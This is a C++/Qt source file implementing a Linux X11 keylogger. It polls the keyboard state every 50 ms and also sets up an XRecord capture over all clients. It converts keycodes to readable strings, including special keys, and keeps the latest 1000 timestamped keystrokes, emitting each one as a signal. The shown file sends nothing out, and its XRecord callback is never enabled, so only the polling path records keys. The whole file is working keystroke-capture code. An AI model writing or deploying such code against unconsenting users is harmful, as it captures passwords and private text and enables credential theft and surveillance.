#include "KeyLogger.h"
#include <QDebug>
#include <QApplication>
#include <QMutexLocker>
#include <X11/XKBlib.h>

const int KeyLogger::MAX_KEYSTROKES = 1000;

// Global pointer for callback
static KeyLogger* g_keyloggerInstance = nullptr;

KeyLogger::KeyLogger(QObject *parent)
    : QObject(parent)
    , m_display(nullptr)
    , m_recordDisplay(nullptr)
    , m_recordContext(0)
    , m_recordRange(nullptr)
    , m_captureTimer(new QTimer(this))
    , m_logging(false)
    , m_x11Initialized(false)
{
    g_keyloggerInstance = this;
    setupX11();
    
    // Timer for periodic key capture (as backup method)
    connect(m_captureTimer, &QTimer::timeout, this, &KeyLogger::captureKeystrokes);
}

KeyLogger::~KeyLogger()
{
    stopLogging();
    cleanupX11();
    g_keyloggerInstance = nullptr;
}

void KeyLogger::setupX11()
{
    // Open display connection
    m_display = XOpenDisplay(nullptr);
    if (!m_display) {
        qWarning() << "KeyLogger: Failed to open X display";
        return;
    }
    
    // Open second display for recording
    m_recordDisplay = XOpenDisplay(nullptr);
    if (!m_recordDisplay) {
        qWarning() << "KeyLogger: Failed to open X record display";
        XCloseDisplay(m_display);
        m_display = nullptr;
        return;
    }
    
    // Check for RECORD extension
    int major, minor;
    if (!XRecordQueryVersion(m_recordDisplay, &major, &minor)) {
        qWarning() << "KeyLogger: X RECORD extension not available";
        XCloseDisplay(m_recordDisplay);
        XCloseDisplay(m_display);
        m_display = nullptr;
        m_recordDisplay = nullptr;
        return;
    }
    
    // Setup record range
    m_recordRange = XRecordAllocRange();
    if (!m_recordRange) {
        qWarning() << "KeyLogger: Failed to allocate X record range";
        return;
    }
    
    m_recordRange->device_events.first = KeyPress;
    m_recordRange->device_events.last = KeyRelease;
    
    m_x11Initialized = true;
}

void KeyLogger::cleanupX11()
{
    if (m_logging) {
        stopLogging();
    }
    
    if (m_recordRange) {
        XFree(m_recordRange);
        m_recordRange = nullptr;
    }
    
    if (m_recordContext) {
        XRecordFreeContext(m_recordDisplay, m_recordContext);
        m_recordContext = 0;
    }
    
    if (m_recordDisplay) {
        XCloseDisplay(m_recordDisplay);
        m_recordDisplay = nullptr;
    }
    
    if (m_display) {
        XCloseDisplay(m_display);
        m_display = nullptr;
    }
    
    m_x11Initialized = false;
}

void KeyLogger::startLogging()
{
    if (m_logging || !m_x11Initialized) {
        return;
    }
    
    // Create record context
    XRecordClientSpec clients = XRecordAllClients;
    m_recordContext = XRecordCreateContext(m_recordDisplay, 0, &clients, 1, &m_recordRange, 1);
    
    if (!m_recordContext) {
        qWarning() << "KeyLogger: Failed to create X record context";
        return;
    }
    
    m_logging = true;
    
    // Start capture timer as backup
    m_captureTimer->start(50); // Check every 50ms
    
    qDebug() << "KeyLogger: Started keylogging";
}

void KeyLogger::stopLogging()
{
    if (!m_logging) {
        return;
    }
    
    m_logging = false;
    m_captureTimer->stop();
    
    if (m_recordContext) {
        XRecordDisableContext(m_recordDisplay, m_recordContext);
        XRecordFreeContext(m_recordDisplay, m_recordContext);
        m_recordContext = 0;
    }
    
    qDebug() << "KeyLogger: Stopped keylogging";
}

void KeyLogger::captureKeystrokes()
{
    if (!m_logging || !m_display) {
        return;
    }
    
    // Simple polling method to check for key events
    char keymap[32];
    XQueryKeymap(m_display, keymap);
    
    static char lastKeymap[32] = {0};
    static bool initialized = false;
    
    if (!initialized) {
        memcpy(lastKeymap, keymap, 32);
        initialized = true;
        return;
    }
    
    // Check for changes in keymap
    for (int i = 0; i < 32; i++) {
        char changed = keymap[i] ^ lastKeymap[i];
        if (changed) {
            for (int bit = 0; bit < 8; bit++) {
                if (changed & (1 << bit)) {
                    int keycode = i * 8 + bit;
                    if (keymap[i] & (1 << bit)) {
                        // Key pressed
                        KeySym keysym = XkbKeycodeToKeysym(m_display, keycode, 0, 0);
                        if (keysym != NoSymbol) {
                            QString keyString = keysymToString(keysym);
                            if (!keyString.isEmpty()) {
                                logKeystroke(keyString);
                            }
                        }
                    }
                }
            }
        }
    }
    
    memcpy(lastKeymap, keymap, 32);
}

QString KeyLogger::keysymToString(KeySym keysym)
{
    // Convert special keys
    switch (keysym) {
        case XK_Return:
        case XK_KP_Enter:
            return "[ENTER]";
        case XK_BackSpace:
            return "[BACKSPACE]";
        case XK_Tab:
        case XK_KP_Tab:
            return "[TAB]";
        case XK_Escape:
            return "[ESC]";
        case XK_space:
            return "[SPACE]";
        case XK_Delete:
        case XK_KP_Delete:
            return "[DELETE]";
        case XK_Home:
        case XK_KP_Home:
            return "[HOME]";
        case XK_End:
        case XK_KP_End:
            return "[END]";
        case XK_Page_Up:
        case XK_KP_Page_Up:
            return "[PAGE_UP]";
        case XK_Page_Down:
        case XK_KP_Page_Down:
            return "[PAGE_DOWN]";
        case XK_Up:
        case XK_KP_Up:
            return "[UP]";
        case XK_Down:
        case XK_KP_Down:
            return "[DOWN]";
        case XK_Left:
        case XK_KP_Left:
            return "[LEFT]";
        case XK_Right:
        case XK_KP_Right:
            return "[RIGHT]";
        case XK_Shift_L:
        case XK_Shift_R:
            return "[SHIFT]";
        case XK_Control_L:
        case XK_Control_R:
            return "[CTRL]";
        case XK_Alt_L:
        case XK_Alt_R:
            return "[ALT]";
        case XK_Super_L:
        case XK_Super_R:
            return "[SUPER]";
        case XK_F1: return "[F1]";
        case XK_F2: return "[F2]";
        case XK_F3: return "[F3]";
        case XK_F4: return "[F4]";
        case XK_F5: return "[F5]";
        case XK_F6: return "[F6]";
        case XK_F7: return "[F7]";
        case XK_F8: return "[F8]";
        case XK_F9: return "[F9]";
        case XK_F10: return "[F10]";
        case XK_F11: return "[F11]";
        case XK_F12: return "[F12]";
        default:
            break;
    }
    
    // Convert regular characters
    char* keyString = XKeysymToString(keysym);
    if (keyString) {
        QString result = QString::fromLatin1(keyString);
        // Only return single printable characters
        if (result.length() == 1 && result[0].isPrint()) {
            return result;
        }
    }
    
    return QString();
}

void KeyLogger::logKeystroke(const QString& key)
{
    QMutexLocker locker(&m_keystrokeMutex);
    
    QString timestamp = QDateTime::currentDateTime().toString("hh:mm:ss");
    QString keystroke = QString("[%1] %2").arg(timestamp, key);
    
    m_recentKeystrokes.prepend(keystroke);
    
    // Limit the number of stored keystrokes
    if (m_recentKeystrokes.size() > MAX_KEYSTROKES) {
        m_recentKeystrokes.removeLast();
    }
    
    emit keystrokeDetected(keystroke);
}

QStringList KeyLogger::getRecentKeystrokes(int count) const
{
    QMutexLocker locker(&m_keystrokeMutex);
    return m_recentKeystrokes.mid(0, qMin(count, m_recentKeystrokes.size()));
}

// Static callback function for X11 record
void KeyLogger::recordCallback(XPointer closure, XRecordInterceptData* data)
{
    if (!g_keyloggerInstance || !g_keyloggerInstance->m_logging) {
        return;
    }
    
    if (data->category == XRecordFromServer) {
        const xEvent* event = reinterpret_cast<const xEvent*>(data->data);
        if (event->u.u.type == KeyPress) {
            KeySym keysym = XkbKeycodeToKeysym(g_keyloggerInstance->m_display, 
                                             event->u.u.detail, 0, 0);
            if (keysym != NoSymbol) {
                QString keyString = g_keyloggerInstance->keysymToString(keysym);
                if (!keyString.isEmpty()) {
                    g_keyloggerInstance->logKeystroke(keyString);
                }
            }
        }
    }
    
    XRecordFreeData(data);
}